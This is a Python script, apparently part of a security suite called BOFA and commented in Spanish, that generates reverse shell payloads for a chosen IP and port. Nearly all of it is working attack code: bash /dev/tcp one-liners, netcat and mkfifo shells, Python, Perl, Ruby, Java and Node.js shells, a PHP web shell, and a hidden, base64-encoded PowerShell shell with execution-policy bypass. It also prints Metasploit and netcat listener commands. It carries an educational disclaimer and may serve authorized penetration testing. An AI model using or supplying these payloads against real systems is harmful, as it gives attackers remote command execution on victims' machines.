
#!/usr/bin/env python3
"""
Reverse Shell Generator - Educational Payload Generator
Author: @descambiado (David Hernández Jiménez)
BOFA - Best Of All Cybersecurity Suite
Educational/Professional Use Only
"""

import argparse
import sys
import ipaddress
import base64
import urllib.parse

class ReverseShellGenerator:
    def __init__(self):
        self.shells = {
            'bash': self.generate_bash_shell,
            'python': self.generate_python_shell,
            'python3': self.generate_python3_shell,
            'perl': self.generate_perl_shell,
            'php': self.generate_php_shell,
            'ruby': self.generate_ruby_shell,
            'netcat': self.generate_netcat_shell,
            'powershell': self.generate_powershell_shell,
            'java': self.generate_java_shell,
            'nodejs': self.generate_nodejs_shell
        }
    
    def validate_ip(self, ip):
        """Valida dirección IP"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port):
        """Valida puerto"""
        try:
            port = int(port)
            return 1 <= port <= 65535
        except ValueError:
            return False
    
    def generate_bash_shell(self, ip, port):
        """Genera reverse shell en Bash"""
        shells = [
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
            f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
            f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
            f"/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1"
        ]
        return shells
    
    def generate_python_shell(self, ip, port):
        """Genera reverse shell en Python 2"""
        shell = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        
        multiline = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])'''
        
        return [shell, multiline]
    
    def generate_python3_shell(self, ip, port):
        """Genera reverse shell en Python 3"""
        shell = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
        
        advanced = f'''import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")'''
        
        return [shell, advanced]
    
    def generate_perl_shell(self, ip, port):
        """Genera reverse shell en Perl"""
        shells = [
            f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
            f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
        ]
        return shells
    
    def generate_php_shell(self, ip, port):
        """Genera reverse shell en PHP"""
        shells = [
            f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""",
            f"""php -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",
            f"""php -r '$s=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'"""
        ]
        
        # PHP web shell
        web_shell = f'''<?php
$ip = '{ip}';
$port = {port};
$sock = fsockopen($ip, $port);
if (!$sock) {{
    die("Cannot connect to $ip:$port");
}}
while (1) {{
    if (feof($sock)) {{
        break;
    }}
    $cmd = fread($sock, 4096);
    $output = shell_exec($cmd);
    fwrite($sock, $output);
}}
fclose($sock);
?>'''
        
        shells.append(web_shell)
        return shells
    
    def generate_ruby_shell(self, ip, port):
        """Genera reverse shell en Ruby"""
        shells = [
            f"""ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
            f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"""
        ]
        return shells
    
    def generate_netcat_shell(self, ip, port):
        """Genera reverse shell con Netcat"""
        shells = [
            f"nc -e /bin/sh {ip} {port}",
            f"nc -e /bin/bash {ip} {port}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            f"nc {ip} {port} -e /bin/bash",
            f"ncat {ip} {port} -e /bin/bash",
            f"ncat --udp {ip} {port} -e /bin/bash"
        ]
        return shells
    
    def generate_powershell_shell(self, ip, port):
        """Genera reverse shell en PowerShell"""
        simple = f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
        
        encoded_payload = base64.b64encode(simple.encode('utf-16le')).decode()
        encoded_cmd = f"powershell -EncodedCommand {encoded_payload}"
        
        return [simple, encoded_cmd]
    
    def generate_java_shell(self, ip, port):
        """Genera reverse shell en Java"""
        shell = f'''import java.io.*;
import java.net.*;

public class ReverseShell {{
    public static void main(String[] args) {{
        try {{
            Socket socket = new Socket("{ip}", {port});
            Process process = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
            InputStream processInput = process.getInputStream();
            InputStream socketInput = socket.getInputStream();
            OutputStream processOutput = process.getOutputStream();
            OutputStream socketOutput = socket.getOutputStream();
            
            while(!socket.isClosed()) {{
                while(processInput.available()>0) {{
                    socketOutput.write(processInput.read());
                }}
                while(socketInput.available()>0) {{
                    processOutput.write(socketInput.read());
                }}
                processOutput.flush();
                socketOutput.flush();
                Thread.sleep(50);
                try {{
                    process.exitValue();
                    break;
                }} catch (Exception e) {{}}
            }}
            process.destroy();
            socket.close();
        }} catch (Exception e) {{}}
    }}
}}'''
        return [shell]
    
    def generate_nodejs_shell(self, ip, port):
        """Genera reverse shell en Node.js"""
        shells = [
            f"""require('child_process').exec('nc -e /bin/sh {ip} {port}')""",
            f"""require('child_process').exec('bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"')""",
            f"""var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect({port}, "{ip}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});"""
        ]
        return shells
    
    def generate_all_shells(self, ip, port):
        """Genera todos los tipos de shells"""
        results = {}
        for shell_type, generator in self.shells.items():
            try:
                results[shell_type] = generator(ip, port)
            except Exception as e:
                results[shell_type] = [f"Error generando {shell_type}: {str(e)}"]
        return results
    
    def generate_listener_commands(self, port):
        """Genera comandos para listeners"""
        listeners = {
            'netcat': f"nc -lvnp {port}",
            'netcat_verbose': f"nc -lvnp {port} -s 0.0.0.0",
            'ncat': f"ncat -lvnp {port}",
            'socat': f"socat file:`tty`,raw,echo=0 tcp-listen:{port}",
            'metasploit': f"use exploit/multi/handler\nset PAYLOAD generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT {port}\nexploit"
        }
        return listeners

def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Generator - Generador educativo de payloads",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  python3 reverse_shell_generator.py --ip 10.10.10.10 --port 4444
  python3 reverse_shell_generator.py --ip 192.168.1.100 --port 1337 --type bash
  python3 reverse_shell_generator.py --ip 10.0.0.5 --port 9999 --output shells.txt
  python3 reverse_shell_generator.py --ip 127.0.0.1 --port 8080 --listeners

⚠️  AVISO LEGAL:
Esta herramienta es solo para fines educativos y testing autorizado.
El uso malintencionado es responsabilidad del usuario.
        """
    )
    
    parser.add_argument('--ip', required=True,
                       help='Dirección IP del atacante')
    parser.add_argument('--port', type=int, required=True,
                       help='Puerto del atacante')
    parser.add_argument('--type', choices=['bash', 'python', 'python3', 'perl', 'php', 'ruby', 'netcat', 'powershell', 'java', 'nodejs', 'all'],
                       default='all', help='Tipo de shell a generar')
    parser.add_argument('--output', help='Archivo de salida')
    parser.add_argument('--listeners', action='store_true',
                       help='Mostrar comandos de listeners')
    parser.add_argument('--encode', action='store_true',
                       help='Generar versiones URL encoded')
    
    args = parser.parse_args()
    
    # Banner
    print("\n🛡️  BOFA - Reverse Shell Generator v1.0")
    print("Desarrollado por @descambiado")
    print("⚠️  Solo para uso educativo y autorizado")
    print("=" * 50)
    
    # Validaciones
    if not ReverseShellGenerator().validate_ip(args.ip):
        print(f"❌ Error: IP inválida '{args.ip}'")
        sys.exit(1)
    
    if not ReverseShellGenerator().validate_port(args.port):
        print(f"❌ Error: Puerto inválido '{args.port}' (debe ser 1-65535)")
        sys.exit(1)
    
    try:
        generator = ReverseShellGenerator()
        
        # Generar shells
        if args.type == 'all':
            shells = generator.generate_all_shells(args.ip, args.port)
        else:
            shells = {args.type: generator.shells[args.type](args.ip, args.port)}
        
        # Preparar salida
        output = f"🎯 REVERSE SHELLS PARA {args.ip}:{args.port}\n"
        output += "=" * 60 + "\n\n"
        
        for shell_type, payloads in shells.items():
            output += f"🔥 {shell_type.upper()}\n"
            output += "-" * 30 + "\n"
            
            for i, payload in enumerate(payloads, 1):
                output += f"{i}. {payload}\n"
                
                # Versión URL encoded si se solicita
                if args.encode and shell_type in ['bash', 'python', 'python3']:
                    encoded = urllib.parse.quote(payload)
                    output += f"   URL Encoded: {encoded}\n"
            
            output += "\n"
        
        # Mostrar listeners si se solicita
        if args.listeners:
            listeners = generator.generate_listener_commands(args.port)
            output += "🎧 COMANDOS DE LISTENERS\n"
            output += "=" * 30 + "\n"
            
            for listener_type, command in listeners.items():
                output += f"• {listener_type.upper()}:\n"
                output += f"  {command}\n\n"
        
        # Disclaimer
        output += "⚠️  DISCLAIMER:\n"
        output += "Este código es solo para fines educativos y testing autorizado.\n"
        output += "El uso no autorizado puede ser ilegal. Úsalo responsablemente.\n"
        
        # Salida
        if args.output:
            with open(args.output, 'w') as f:
                f.write(output)
            print(f"💾 Shells guardadas en: {args.output}")
        else:
            print(output)
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
